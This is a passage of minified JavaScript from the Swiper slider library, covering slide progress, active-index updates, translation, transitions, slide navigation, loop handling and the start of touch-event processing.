        const p = (o + (s.centeredSlides ? t.minTranslate() : 0) - d) / (c.swiperSlideSize + l),
            u = (o - r[0] + (s.centeredSlides ? t.minTranslate() : 0) - d) / (c.swiperSlideSize + l),
            g = -(o - d),
            w = g + t.slidesSizesGrid[a],
            b = g >= 0 && g <= t.size - t.slidesSizesGrid[a];
        (g >= 0 && g < t.size - 1 || w > 1 && w <= t.size || g <= 0 && w >= t.size) && (t.visibleSlides.push(c), t.visibleSlidesIndexes.push(a), n[a].classList.add(s.slideVisibleClass)), b && n[a].classList.add(s.slideFullyVisibleClass), c.progress = i ? -p : p, c.originalProgress = i ? -u : u
    }
}

function x0(e) {
    const t = this;
    if (typeof e > "u") {
        const d = t.rtlTranslate ? -1 : 1;
        e = t && t.translate && t.translate * d || 0
    }
    const s = t.params,
        n = t.maxTranslate() - t.minTranslate();
    let {
        progress: i,
        isBeginning: r,
        isEnd: o,
        progressLoop: l
    } = t;
    const a = r,
        c = o;
    if (n === 0) i = 0, r = !0, o = !0;
    else {
        i = (e - t.minTranslate()) / n;
        const d = Math.abs(e - t.minTranslate()) < 1,
            p = Math.abs(e - t.maxTranslate()) < 1;
        r = d || i <= 0, o = p || i >= 1, d && (i = 0), p && (i = 1)
    }
    if (s.loop) {
        const d = t.getSlideIndexByData(0),
            p = t.getSlideIndexByData(t.slides.length - 1),
            u = t.slidesGrid[d],
            g = t.slidesGrid[p],
            w = t.slidesGrid[t.slidesGrid.length - 1],
            b = Math.abs(e);
        b >= u ? l = (b - u) / w : l = (b + w - g) / w, l > 1 && (l -= 1)
    }
    Object.assign(t, {
        progress: i,
        progressLoop: l,
        isBeginning: r,
        isEnd: o
    }), (s.watchSlidesProgress || s.centeredSlides && s.autoHeight) && t.updateSlidesProgress(e), r && !a && t.emit("reachBeginning toEdge"), o && !c && t.emit("reachEnd toEdge"), (a && !r || c && !o) && t.emit("fromEdge"), t.emit("progress", i)
}

function _0() {
    const e = this,
        {
            slides: t,
            params: s,
            slidesEl: n,
            activeIndex: i
        } = e,
        r = e.virtual && s.virtual.enabled,
        o = e.grid && s.grid && s.grid.rows > 1,
        l = p => Ct(n, `.${s.slideClass}${p}, swiper-slide${p}`)[0];
    t.forEach(p => {
        p.classList.remove(s.slideActiveClass, s.slideNextClass, s.slidePrevClass)
    });
    let a, c, d;
    if (r)
        if (s.loop) {
            let p = i - e.virtual.slidesBefore;
            p < 0 && (p = e.virtual.slides.length + p), p >= e.virtual.slides.length && (p -= e.virtual.slides.length), a = l(`[data-swiper-slide-index="${p}"]`)
        } else a = l(`[data-swiper-slide-index="${i}"]`);
    else o ? (a = t.filter(p => p.column === i)[0], d = t.filter(p => p.column === i + 1)[0], c = t.filter(p => p.column === i - 1)[0]) : a = t[i];
    a && (a.classList.add(s.slideActiveClass), o ? (d && d.classList.add(s.slideNextClass), c && c.classList.add(s.slidePrevClass)) : (d = a0(a, `.${s.slideClass}, swiper-slide`)[0], s.loop && !d && (d = t[0]), d && d.classList.add(s.slideNextClass), c = o0(a, `.${s.slideClass}, swiper-slide`)[0], s.loop && !c === 0 && (c = t[t.length - 1]), c && c.classList.add(s.slidePrevClass))), e.emitSlidesClasses()
}
const ei = (e, t) => {
        if (!e || e.destroyed || !e.params) return;
        const s = () => e.isElement ? "swiper-slide" : `.${e.params.slideClass}`,
            n = t.closest(s());
        if (n) {
            let i = n.querySelector(`.${e.params.lazyPreloaderClass}`);
            !i && e.isElement && (n.shadowRoot ? i = n.shadowRoot.querySelector(`.${e.params.lazyPreloaderClass}`) : requestAnimationFrame(() => {
                n.shadowRoot && (i = n.shadowRoot.querySelector(`.${e.params.lazyPreloaderClass}`), i && i.remove())
            })), i && i.remove()
        }
    },
    gr = (e, t) => {
        if (!e.slides[t]) return;
        const s = e.slides[t].querySelector('[loading="lazy"]');
        s && s.removeAttribute("loading")
    },
    qr = e => {
        if (!e || e.destroyed || !e.params) return;
        let t = e.params.lazyPreloadPrevNext;
        const s = e.slides.length;
        if (!s || !t || t < 0) return;
        t = Math.min(t, s);
        const n = e.params.slidesPerView === "auto" ? e.slidesPerViewDynamic() : Math.ceil(e.params.slidesPerView),
            i = e.activeIndex;
        if (e.params.grid && e.params.grid.rows > 1) {
            const o = i,
                l = [o - t];
            l.push(...Array.from({
                length: t
            }).map((a, c) => o + n + c)), e.slides.forEach((a, c) => {
                l.includes(a.column) && gr(e, c)
            });
            return
        }
        const r = i + n - 1;
        if (e.params.rewind || e.params.loop)
            for (let o = i - t; o <= r + t; o += 1) {
                const l = (o % s + s) % s;
                (l < i || l > r) && gr(e, l)
            } else
                for (let o = Math.max(i - t, 0); o <= Math.min(r + t, s - 1); o += 1) o !== i && (o > r || o < i) && gr(e, o)
    };

function C0(e) {
    const {
        slidesGrid: t,
        params: s
    } = e, n = e.rtlTranslate ? e.translate : -e.translate;
    let i;
    for (let r = 0; r < t.length; r += 1) typeof t[r + 1] < "u" ? n >= t[r] && n < t[r + 1] - (t[r + 1] - t[r]) / 2 ? i = r : n >= t[r] && n < t[r + 1] && (i = r + 1) : n >= t[r] && (i = r);
    return s.normalizeSlideIndex && (i < 0 || typeof i > "u") && (i = 0), i
}

function S0(e) {
    const t = this,
        s = t.rtlTranslate ? t.translate : -t.translate,
        {
            snapGrid: n,
            params: i,
            activeIndex: r,
            realIndex: o,
            snapIndex: l
        } = t;
    let a = e,
        c;
    const d = g => {
        let w = g - t.virtual.slidesBefore;
        return w < 0 && (w = t.virtual.slides.length + w), w >= t.virtual.slides.length && (w -= t.virtual.slides.length), w
    };
    if (typeof a > "u" && (a = C0(t)), n.indexOf(s) >= 0) c = n.indexOf(s);
    else {
        const g = Math.min(i.slidesPerGroupSkip, a);
        c = g + Math.floor((a - g) / i.slidesPerGroup)
    }
    if (c >= n.length && (c = n.length - 1), a === r && !t.params.loop) {
        c !== l && (t.snapIndex = c, t.emit("snapIndexChange"));
        return
    }
    if (a === r && t.params.loop && t.virtual && t.params.virtual.enabled) {
        t.realIndex = d(a);
        return
    }
    const p = t.grid && i.grid && i.grid.rows > 1;
    let u;
    if (t.virtual && i.virtual.enabled && i.loop) u = d(a);
    else if (p) {
        const g = t.slides.filter(b => b.column === a)[0];
        let w = parseInt(g.getAttribute("data-swiper-slide-index"), 10);
        Number.isNaN(w) && (w = Math.max(t.slides.indexOf(g), 0)), u = Math.floor(w / i.grid.rows)
    } else if (t.slides[a]) {
        const g = t.slides[a].getAttribute("data-swiper-slide-index");
        g ? u = parseInt(g, 10) : u = a
    } else u = a;
    Object.assign(t, {
        previousSnapIndex: l,
        snapIndex: c,
        previousRealIndex: o,
        realIndex: u,
        previousIndex: r,
        activeIndex: a
    }), t.initialized && qr(t), t.emit("activeIndexChange"), t.emit("snapIndexChange"), (t.initialized || t.params.runCallbacksOnInit) && (o !== u && t.emit("realIndexChange"), t.emit("slideChange"))
}

function E0(e, t) {
    const s = this,
        n = s.params;
    let i = e.closest(`.${n.slideClass}, swiper-slide`);
    !i && s.isElement && t && t.length > 1 && t.includes(e) && [...t.slice(t.indexOf(e) + 1, t.length)].forEach(l => {
        !i && l.matches && l.matches(`.${n.slideClass}, swiper-slide`) && (i = l)
    });
    let r = !1,
        o;
    if (i) {
        for (let l = 0; l < s.slides.length; l += 1)
            if (s.slides[l] === i) {
                r = !0, o = l;
                break
            }
    }
    if (i && r) s.clickedSlide = i, s.virtual && s.params.virtual.enabled ? s.clickedIndex = parseInt(i.getAttribute("data-swiper-slide-index"), 10) : s.clickedIndex = o;
    else {
        s.clickedSlide = void 0, s.clickedIndex = void 0;
        return
    }
    n.slideToClickedSlide && s.clickedIndex !== void 0 && s.clickedIndex !== s.activeIndex && s.slideToClickedSlide()
}
var T0 = {
    updateSize: m0,
    updateSlides: v0,
    updateAutoHeight: y0,
    updateSlidesOffset: b0,
    updateSlidesProgress: w0,
    updateProgress: x0,
    updateSlidesClasses: _0,
    updateActiveIndex: S0,
    updateClickedSlide: E0
};

function A0(e) {
    e === void 0 && (e = this.isHorizontal() ? "x" : "y");
    const t = this,
        {
            params: s,
            rtlTranslate: n,
            translate: i,
            wrapperEl: r
        } = t;
    if (s.virtualTranslate) return n ? -i : i;
    if (s.cssMode) return i;
    let o = i0(r, e);
    return o += t.cssOverflowAdjustment(), n && (o = -o), o || 0
}

function L0(e, t) {
    const s = this,
        {
            rtlTranslate: n,
            params: i,
            wrapperEl: r,
            progress: o
        } = s;
    let l = 0,
        a = 0;
    const c = 0;
    s.isHorizontal() ? l = n ? -e : e : a = e, i.roundLengths && (l = Math.floor(l), a = Math.floor(a)), s.previousTranslate = s.translate, s.translate = s.isHorizontal() ? l : a, i.cssMode ? r[s.isHorizontal() ? "scrollLeft" : "scrollTop"] = s.isHorizontal() ? -l : -a : i.virtualTranslate || (s.isHorizontal() ? l -= s.cssOverflowAdjustment() : a -= s.cssOverflowAdjustment(), r.style.transform = `translate3d(${l}px, ${a}px, ${c}px)`);
    let d;
    const p = s.maxTranslate() - s.minTranslate();
    p === 0 ? d = 0 : d = (e - s.minTranslate()) / p, d !== o && s.updateProgress(e), s.emit("setTranslate", s.translate, t)
}

function I0() {
    return -this.snapGrid[0]
}

function N0() {
    return -this.snapGrid[this.snapGrid.length - 1]
}

function P0(e, t, s, n, i) {
    e === void 0 && (e = 0), t === void 0 && (t = this.params.speed), s === void 0 && (s = !0), n === void 0 && (n = !0);
    const r = this,
        {
            params: o,
            wrapperEl: l
        } = r;
    if (r.animating && o.preventInteractionOnTransition) return !1;
    const a = r.minTranslate(),
        c = r.maxTranslate();
    let d;
    if (n && e > a ? d = a : n && e < c ? d = c : d = e, r.updateProgress(d), o.cssMode) {
        const p = r.isHorizontal();
        if (t === 0) l[p ? "scrollLeft" : "scrollTop"] = -d;
        else {
            if (!r.support.smoothScroll) return pd({
                swiper: r,
                targetPosition: -d,
                side: p ? "left" : "top"
            }), !0;
            l.scrollTo({
                [p ? "left" : "top"]: -d,
                behavior: "smooth"
            })
        }
        return !0
    }
    return t === 0 ? (r.setTransition(0), r.setTranslate(d), s && (r.emit("beforeTransitionStart", t, i), r.emit("transitionEnd"))) : (r.setTransition(t), r.setTranslate(d), s && (r.emit("beforeTransitionStart", t, i), r.emit("transitionStart")), r.animating || (r.animating = !0, r.onTranslateToWrapperTransitionEnd || (r.onTranslateToWrapperTransitionEnd = function(u) {
        !r || r.destroyed || u.target === this && (r.wrapperEl.removeEventListener("transitionend", r.onTranslateToWrapperTransitionEnd), r.onTranslateToWrapperTransitionEnd = null, delete r.onTranslateToWrapperTransitionEnd, s && r.emit("transitionEnd"))
    }), r.wrapperEl.addEventListener("transitionend", r.onTranslateToWrapperTransitionEnd))), !0
}
var M0 = {
    getTranslate: A0,
    setTranslate: L0,
    minTranslate: I0,
    maxTranslate: N0,
    translateTo: P0
};

function k0(e, t) {
    const s = this;
    s.params.cssMode || (s.wrapperEl.style.transitionDuration = `${e}ms`, s.wrapperEl.style.transitionDelay = e === 0 ? "0ms" : ""), s.emit("setTransition", e, t)
}

function gd(e) {
    let {
        swiper: t,
        runCallbacks: s,
        direction: n,
        step: i
    } = e;
    const {
        activeIndex: r,
        previousIndex: o
    } = t;
    let l = n;
    if (l || (r > o ? l = "next" : r < o ? l = "prev" : l = "reset"), t.emit(`transition${i}`), s && r !== o) {
        if (l === "reset") {
            t.emit(`slideResetTransition${i}`);
            return
        }
        t.emit(`slideChangeTransition${i}`), l === "next" ? t.emit(`slideNextTransition${i}`) : t.emit(`slidePrevTransition${i}`)
    }
}

function O0(e, t) {
    e === void 0 && (e = !0);
    const s = this,
        {
            params: n
        } = s;
    n.cssMode || (n.autoHeight && s.updateAutoHeight(), gd({
        swiper: s,
        runCallbacks: e,
        direction: t,
        step: "Start"
    }))
}

function $0(e, t) {
    e === void 0 && (e = !0);
    const s = this,
        {
            params: n
        } = s;
    s.animating = !1, !n.cssMode && (s.setTransition(0), gd({
        swiper: s,
        runCallbacks: e,
        direction: t,
        step: "End"
    }))
}
var R0 = {
    setTransition: k0,
    transitionStart: O0,
    transitionEnd: $0
};

function D0(e, t, s, n, i) {
    e === void 0 && (e = 0), t === void 0 && (t = this.params.speed), s === void 0 && (s = !0), typeof e == "string" && (e = parseInt(e, 10));
    const r = this;
    let o = e;
    o < 0 && (o = 0);
    const {
        params: l,
        snapGrid: a,
        slidesGrid: c,
        previousIndex: d,
        activeIndex: p,
        rtlTranslate: u,
        wrapperEl: g,
        enabled: w
    } = r;
    if (r.animating && l.preventInteractionOnTransition || !w && !n && !i) return !1;
    const b = Math.min(r.params.slidesPerGroupSkip, o);
    let S = b + Math.floor((o - b) / r.params.slidesPerGroup);
    S >= a.length && (S = a.length - 1);
    const x = -a[S];
    if (l.normalizeSlideIndex)
        for (let y = 0; y < c.length; y += 1) {
            const C = -Math.floor(x * 100),
                L = Math.floor(c[y] * 100),
                M = Math.floor(c[y + 1] * 100);
            typeof c[y + 1] < "u" ? C >= L && C < M - (M - L) / 2 ? o = y : C >= L && C < M && (o = y + 1) : C >= L && (o = y)
        }
    if (r.initialized && o !== p && (!r.allowSlideNext && (u ? x > r.translate && x > r.minTranslate() : x < r.translate && x < r.minTranslate()) || !r.allowSlidePrev && x > r.translate && x > r.maxTranslate() && (p || 0) !== o)) return !1;
    o !== (d || 0) && s && r.emit("beforeSlideChangeStart"), r.updateProgress(x);
    let v;
    if (o > p ? v = "next" : o < p ? v = "prev" : v = "reset", u && -x === r.translate || !u && x === r.translate) return r.updateActiveIndex(o), l.autoHeight && r.updateAutoHeight(), r.updateSlidesClasses(), l.effect !== "slide" && r.setTranslate(x), v !== "reset" && (r.transitionStart(s, v), r.transitionEnd(s, v)), !1;
    if (l.cssMode) {
        const y = r.isHorizontal(),
            C = u ? x : -x;
        if (t === 0) {
            const L = r.virtual && r.params.virtual.enabled;
            L && (r.wrapperEl.style.scrollSnapType = "none", r._immediateVirtual = !0), L && !r._cssModeVirtualInitialSet && r.params.initialSlide > 0 ? (r._cssModeVirtualInitialSet = !0, requestAnimationFrame(() => {
                g[y ? "scrollLeft" : "scrollTop"] = C
            })) : g[y ? "scrollLeft" : "scrollTop"] = C, L && requestAnimationFrame(() => {
                r.wrapperEl.style.scrollSnapType = "", r._immediateVirtual = !1
            })
        } else {
            if (!r.support.smoothScroll) return pd({
                swiper: r,
                targetPosition: C,
                side: y ? "left" : "top"
            }), !0;
            g.scrollTo({
                [y ? "left" : "top"]: C,
                behavior: "smooth"
            })
        }
        return !0
    }
    return r.setTransition(t), r.setTranslate(x), r.updateActiveIndex(o), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, n), r.transitionStart(s, v), t === 0 ? r.transitionEnd(s, v) : r.animating || (r.animating = !0, r.onSlideToWrapperTransitionEnd || (r.onSlideToWrapperTransitionEnd = function(C) {
        !r || r.destroyed || C.target === this && (r.wrapperEl.removeEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.onSlideToWrapperTransitionEnd = null, delete r.onSlideToWrapperTransitionEnd, r.transitionEnd(s, v))
    }), r.wrapperEl.addEventListener("transitionend", r.onSlideToWrapperTransitionEnd)), !0
}

function H0(e, t, s, n) {
    e === void 0 && (e = 0), t === void 0 && (t = this.params.speed), s === void 0 && (s = !0), typeof e == "string" && (e = parseInt(e, 10));
    const i = this,
        r = i.grid && i.params.grid && i.params.grid.rows > 1;
    let o = e;
    if (i.params.loop)
        if (i.virtual && i.params.virtual.enabled) o = o + i.virtual.slidesBefore;
        else {
            let l;
            if (r) {
                const u = o * i.params.grid.rows;
                l = i.slides.filter(g => g.getAttribute("data-swiper-slide-index") * 1 === u)[0].column
            } else l = i.getSlideIndexByData(o);
            const a = r ? Math.ceil(i.slides.length / i.params.grid.rows) : i.slides.length,
                {
                    centeredSlides: c
                } = i.params;
            let d = i.params.slidesPerView;
            d === "auto" ? d = i.slidesPerViewDynamic() : (d = Math.ceil(parseFloat(i.params.slidesPerView, 10)), c && d % 2 === 0 && (d = d + 1));
            let p = a - l < d;
            if (c && (p = p || l < Math.ceil(d / 2)), p) {
                const u = c ? l < i.activeIndex ? "prev" : "next" : l - i.activeIndex - 1 < i.params.slidesPerView ? "next" : "prev";
                i.loopFix({
                    direction: u,
                    slideTo: !0,
                    activeSlideIndex: u === "next" ? l + 1 : l - a + 1,
                    slideRealIndex: u === "next" ? i.realIndex : void 0
                })
            }
            if (r) {
                const u = o * i.params.grid.rows;
                o = i.slides.filter(g => g.getAttribute("data-swiper-slide-index") * 1 === u)[0].column
            } else o = i.getSlideIndexByData(o)
        }
    return requestAnimationFrame(() => {
        i.slideTo(o, t, s, n)
    }), i
}

function V0(e, t, s) {
    e === void 0 && (e = this.params.speed), t === void 0 && (t = !0);
    const n = this,
        {
            enabled: i,
            params: r,
            animating: o
        } = n;
    if (!i) return n;
    let l = r.slidesPerGroup;
    r.slidesPerView === "auto" && r.slidesPerGroup === 1 && r.slidesPerGroupAuto && (l = Math.max(n.slidesPerViewDynamic("current", !0), 1));
    const a = n.activeIndex < r.slidesPerGroupSkip ? 1 : l,
        c = n.virtual && r.virtual.enabled;
    if (r.loop) {
        if (o && !c && r.loopPreventsSliding) return !1;
        if (n.loopFix({
                direction: "next"
            }), n._clientLeft = n.wrapperEl.clientLeft, n.activeIndex === n.slides.length - 1 && r.cssMode) return requestAnimationFrame(() => {
            n.slideTo(n.activeIndex + a, e, t, s)
        }), !0
    }
    return r.rewind && n.isEnd ? n.slideTo(0, e, t, s) : n.slideTo(n.activeIndex + a, e, t, s)
}

function j0(e, t, s) {
    e === void 0 && (e = this.params.speed), t === void 0 && (t = !0);
    const n = this,
        {
            params: i,
            snapGrid: r,
            slidesGrid: o,
            rtlTranslate: l,
            enabled: a,
            animating: c
        } = n;
    if (!a) return n;
    const d = n.virtual && i.virtual.enabled;
    if (i.loop) {
        if (c && !d && i.loopPreventsSliding) return !1;
        n.loopFix({
            direction: "prev"
        }), n._clientLeft = n.wrapperEl.clientLeft
    }
    const p = l ? n.translate : -n.translate;

    function u(x) {
        return x < 0 ? -Math.floor(Math.abs(x)) : Math.floor(x)
    }
    const g = u(p),
        w = r.map(x => u(x));
    let b = r[w.indexOf(g) - 1];
    if (typeof b > "u" && i.cssMode) {
        let x;
        r.forEach((v, y) => {
            g >= v && (x = y)
        }), typeof x < "u" && (b = r[x > 0 ? x - 1 : x])
    }
    let S = 0;
    if (typeof b < "u" && (S = o.indexOf(b), S < 0 && (S = n.activeIndex - 1), i.slidesPerView === "auto" && i.slidesPerGroup === 1 && i.slidesPerGroupAuto && (S = S - n.slidesPerViewDynamic("previous", !0) + 1, S = Math.max(S, 0))), i.rewind && n.isBeginning) {
        const x = n.params.virtual && n.params.virtual.enabled && n.virtual ? n.virtual.slides.length - 1 : n.slides.length - 1;
        return n.slideTo(x, e, t, s)
    } else if (i.loop && n.activeIndex === 0 && i.cssMode) return requestAnimationFrame(() => {
        n.slideTo(S, e, t, s)
    }), !0;
    return n.slideTo(S, e, t, s)
}

function B0(e, t, s) {
    e === void 0 && (e = this.params.speed), t === void 0 && (t = !0);
    const n = this;
    return n.slideTo(n.activeIndex, e, t, s)
}

function F0(e, t, s, n) {
    e === void 0 && (e = this.params.speed), t === void 0 && (t = !0), n === void 0 && (n = .5);
    const i = this;
    let r = i.activeIndex;
    const o = Math.min(i.params.slidesPerGroupSkip, r),
        l = o + Math.floor((r - o) / i.params.slidesPerGroup),
        a = i.rtlTranslate ? i.translate : -i.translate;
    if (a >= i.snapGrid[l]) {
        const c = i.snapGrid[l],
            d = i.snapGrid[l + 1];
        a - c > (d - c) * n && (r += i.params.slidesPerGroup)
    } else {
        const c = i.snapGrid[l - 1],
            d = i.snapGrid[l];
        a - c <= (d - c) * n && (r -= i.params.slidesPerGroup)
    }
    return r = Math.max(r, 0), r = Math.min(r, i.slidesGrid.length - 1), i.slideTo(r, e, t, s)
}

function z0() {
    const e = this,
        {
            params: t,
            slidesEl: s
        } = e,
        n = t.slidesPerView === "auto" ? e.slidesPerViewDynamic() : t.slidesPerView;
    let i = e.clickedIndex,
        r;
    const o = e.isElement ? "swiper-slide" : `.${t.slideClass}`;
    if (t.loop) {
        if (e.animating) return;
        r = parseInt(e.clickedSlide.getAttribute("data-swiper-slide-index"), 10), t.centeredSlides ? i < e.loopedSlides - n / 2 || i > e.slides.length - e.loopedSlides + n / 2 ? (e.loopFix(), i = e.getSlideIndex(Ct(s, `${o}[data-swiper-slide-index="${r}"]`)[0]), Gr(() => {
            e.slideTo(i)
        })) : e.slideTo(i) : i > e.slides.length - n ? (e.loopFix(), i = e.getSlideIndex(Ct(s, `${o}[data-swiper-slide-index="${r}"]`)[0]), Gr(() => {
            e.slideTo(i)
        })) : e.slideTo(i)
    } else e.slideTo(i)
}
var U0 = {
    slideTo: D0,
    slideToLoop: H0,
    slideNext: V0,
    slidePrev: j0,
    slideReset: B0,
    slideToClosest: F0,
    slideToClickedSlide: z0
};

function G0(e) {
    const t = this,
        {
            params: s,
            slidesEl: n
        } = t;
    if (!s.loop || t.virtual && t.params.virtual.enabled) return;
    const i = () => {
            Ct(n, `.${s.slideClass}, swiper-slide`).forEach((p, u) => {
                p.setAttribute("data-swiper-slide-index", u)
            })
        },
        r = t.grid && s.grid && s.grid.rows > 1,
        o = s.slidesPerGroup * (r ? s.grid.rows : 1),
        l = t.slides.length % o !== 0,
        a = r && t.slides.length % s.grid.rows !== 0,
        c = d => {
            for (let p = 0; p < d; p += 1) {
                const u = t.isElement ? fi("swiper-slide", [s.slideBlankClass]) : fi("div", [s.slideClass, s.slideBlankClass]);
                t.slidesEl.append(u)
            }
        };
    if (l) {
        if (s.loopAddBlankSlides) {
            const d = o - t.slides.length % o;
            c(d), t.recalcSlides(), t.updateSlides()
        } else di("Swiper Loop Warning: The number of slides is not even to slidesPerGroup, loop mode may not function properly. You need to add more slides (or make duplicates, or empty slides)");
        i()
    } else if (a) {
        if (s.loopAddBlankSlides) {
            const d = s.grid.rows - t.slides.length % s.grid.rows;
            c(d), t.recalcSlides(), t.updateSlides()
        } else di("Swiper Loop Warning: The number of slides is not even to grid.rows, loop mode may not function properly. You need to add more slides (or make duplicates, or empty slides)");
        i()
    } else i();
    t.loopFix({
        slideRealIndex: e,
        direction: s.centeredSlides ? void 0 : "next"
    })
}

function W0(e) {
    let {
        slideRealIndex: t,
        slideTo: s = !0,
        direction: n,
        setTranslate: i,
        activeSlideIndex: r,
        byController: o,
        byMousewheel: l
    } = e === void 0 ? {} : e;
    const a = this;
    if (!a.params.loop) return;
    a.emit("beforeLoopFix");
    const {
        slides: c,
        allowSlidePrev: d,
        allowSlideNext: p,
        slidesEl: u,
        params: g
    } = a, {
        centeredSlides: w
    } = g;
    if (a.allowSlidePrev = !0, a.allowSlideNext = !0, a.virtual && g.virtual.enabled) {
        s && (!g.centeredSlides && a.snapIndex === 0 ? a.slideTo(a.virtual.slides.length, 0, !1, !0) : g.centeredSlides && a.snapIndex < g.slidesPerView ? a.slideTo(a.virtual.slides.length + a.snapIndex, 0, !1, !0) : a.snapIndex === a.snapGrid.length - 1 && a.slideTo(a.virtual.slidesBefore, 0, !1, !0)), a.allowSlidePrev = d, a.allowSlideNext = p, a.emit("loopFix");
        return
    }
    let b = g.slidesPerView;
    b === "auto" ? b = a.slidesPerViewDynamic() : (b = Math.ceil(parseFloat(g.slidesPerView, 10)), w && b % 2 === 0 && (b = b + 1));
    const S = g.slidesPerGroupAuto ? b : g.slidesPerGroup;
    let x = S;
    x % S !== 0 && (x += S - x % S), x += g.loopAdditionalSlides, a.loopedSlides = x;
    const v = a.grid && g.grid && g.grid.rows > 1;
    c.length < b + x ? di("Swiper Loop Warning: The number of slides is not enough for loop mode, it will be disabled and not function properly. You need to add more slides (or make duplicates) or lower the values of slidesPerView and slidesPerGroup parameters") : v && g.grid.fill === "row" && di("Swiper Loop Warning: Loop mode is not compatible with grid.fill = `row`");
    const y = [],
        C = [];
    let L = a.activeIndex;
    typeof r > "u" ? r = a.getSlideIndex(c.filter(V => V.classList.contains(g.slideActiveClass))[0]) : L = r;
    const M = n === "next" || !n,
        se = n === "prev" || !n;
    let W = 0,
        N = 0;
    const P = v ? Math.ceil(c.length / g.grid.rows) : c.length,
        X = (v ? c[r].column : r) + (w && typeof i > "u" ? -b / 2 + .5 : 0);
    if (X < x) {
        W = Math.max(x - X, S);
        for (let V = 0; V < x - X; V += 1) {
            const te = V - Math.floor(V / P) * P;
            if (v) {
                const ne = P - te - 1;
                for (let re = c.length - 1; re >= 0; re -= 1) c[re].column === ne && y.push(re)
            } else y.push(P - te - 1)
        }
    } else if (X + b > P - x) {
        N = Math.max(X - (P - x * 2), S);
        for (let V = 0; V < N; V += 1) {
            const te = V - Math.floor(V / P) * P;
            v ? c.forEach((ne, re) => {
                ne.column === te && C.push(re)
            }) : C.push(te)
        }
    }
    if (a.__preventObserver__ = !0, requestAnimationFrame(() => {
            a.__preventObserver__ = !1
        }), se && y.forEach(V => {
            c[V].swiperLoopMoveDOM = !0, u.prepend(c[V]), c[V].swiperLoopMoveDOM = !1
        }), M && C.forEach(V => {
            c[V].swiperLoopMoveDOM = !0, u.append(c[V]), c[V].swiperLoopMoveDOM = !1
        }), a.recalcSlides(), g.slidesPerView === "auto" ? a.updateSlides() : v && (y.length > 0 && se || C.length > 0 && M) && a.slides.forEach((V, te) => {
            a.grid.updateSlide(te, V, a.slides)
        }), g.watchSlidesProgress && a.updateSlidesOffset(), s) {
        if (y.length > 0 && se) {
            if (typeof t > "u") {
                const V = a.slidesGrid[L],
                    ne = a.slidesGrid[L + W] - V;
                l ? a.setTranslate(a.translate - ne) : (a.slideTo(L + W, 0, !1, !0), i && (a.touchEventsData.startTranslate = a.touchEventsData.startTranslate - ne, a.touchEventsData.currentTranslate = a.touchEventsData.currentTranslate - ne))
            } else if (i) {
                const V = v ? y.length / g.grid.rows : y.length;
                a.slideTo(a.activeIndex + V, 0, !1, !0), a.touchEventsData.currentTranslate = a.translate
            }
        } else if (C.length > 0 && M)
            if (typeof t > "u") {
                const V = a.slidesGrid[L],
                    ne = a.slidesGrid[L - N] - V;
                l ? a.setTranslate(a.translate - ne) : (a.slideTo(L - N, 0, !1, !0), i && (a.touchEventsData.startTranslate = a.touchEventsData.startTranslate - ne, a.touchEventsData.currentTranslate = a.touchEventsData.currentTranslate - ne))
            } else {
                const V = v ? C.length / g.grid.rows : C.length;
                a.slideTo(a.activeIndex - V, 0, !1, !0)
            }
    }
    if (a.allowSlidePrev = d, a.allowSlideNext = p, a.controller && a.controller.control && !o) {
        const V = {
            slideRealIndex: t,
            direction: n,
            setTranslate: i,
            activeSlideIndex: r,
            byController: !0
        };
        Array.isArray(a.controller.control) ? a.controller.control.forEach(te => {
            !te.destroyed && te.params.loop && te.loopFix({ ...V,
                slideTo: te.params.slidesPerView === g.slidesPerView ? s : !1
            })
        }) : a.controller.control instanceof a.constructor && a.controller.control.params.loop && a.controller.control.loopFix({ ...V,
            slideTo: a.controller.control.params.slidesPerView === g.slidesPerView ? s : !1
        })
    }
    a.emit("loopFix")
}

function q0() {
    const e = this,
        {
            params: t,
            slidesEl: s
        } = e;
    if (!t.loop || e.virtual && e.params.virtual.enabled) return;
    e.recalcSlides();
    const n = [];
    e.slides.forEach(i => {
        const r = typeof i.swiperSlideIndex > "u" ? i.getAttribute("data-swiper-slide-index") * 1 : i.swiperSlideIndex;
        n[r] = i
    }), e.slides.forEach(i => {
        i.removeAttribute("data-swiper-slide-index")
    }), n.forEach(i => {
        s.append(i)
    }), e.recalcSlides(), e.slideTo(e.realIndex, 0)
}
var K0 = {
    loopCreate: G0,
    loopFix: W0,
    loopDestroy: q0
};

function Z0(e) {
    const t = this;
    if (!t.params.simulateTouch || t.params.watchOverflow && t.isLocked || t.params.cssMode) return;
    const s = t.params.touchEventsTarget === "container" ? t.el : t.wrapperEl;
    t.isElement && (t.__preventObserver__ = !0), s.style.cursor = "move", s.style.cursor = e ? "grabbing" : "grab", t.isElement && requestAnimationFrame(() => {
        t.__preventObserver__ = !1
    })
}

function X0() {
    const e = this;
    e.params.watchOverflow && e.isLocked || e.params.cssMode || (e.isElement && (e.__preventObserver__ = !0), e[e.params.touchEventsTarget === "container" ? "el" : "wrapperEl"].style.cursor = "", e.isElement && requestAnimationFrame(() => {
        e.__preventObserver__ = !1
    }))
}
var Y0 = {
    setGrabCursor: Z0,
    unsetGrabCursor: X0
};

function Q0(e, t) {
    t === void 0 && (t = this);

    function s(n) {
        if (!n || n === js() || n === st()) return null;
        n.assignedSlot && (n = n.assignedSlot);
        const i = n.closest(e);
        return !i && !n.getRootNode ? null : i || s(n.getRootNode().host)
    }
    return s(t)
}

function wl(e, t, s) {
    const n = st(),
        {
            params: i
        } = e,
        r = i.edgeSwipeDetection,
        o = i.edgeSwipeThreshold;
    return r && (s <= o || s >= n.innerWidth - o) ? r === "prevent" ? (t.preventDefault(), !0) : !1 : !0
}

function J0(e) {
    const t = this,
        s = js();
    let n = e;
    n.originalEvent && (n = n.originalEvent);
    const i = t.touchEventsData;
    if (n.type === "pointerdown") {
        if (i.pointerId !== null && i.pointerId !== n.pointerId) return;
        i.pointerId = n.pointerId
    } else n.type === "touchstart" && n.targetTouches.length === 1 && (i.touchId = n.targetTouches[0].identifier);
    if (n.type === "touchstart") {
        wl(t, n, n.targetTouches[0].pageX);
        return
    }
    const {
        params: r,
        touches: o,
        enabled: l
    } = t;
    if (!l || !r.simulateTouch && n.pointerType === "mouse" || t.animating && r.preventInteractionOnTransition) return;
    !t.animating && r.cssMode && r.loop && t.loopFix();
    let a = n.target;
    if (r.touchEventsTarget === "wrapper" && !t.wrapperEl.contains(a) || "which" in n && n.which === 3 || "button" in n && n.button > 0 || i.isTouched && i.isMoved) return;
    const c = !!r.noSwipingClass && r.noSwipingClass !== "",
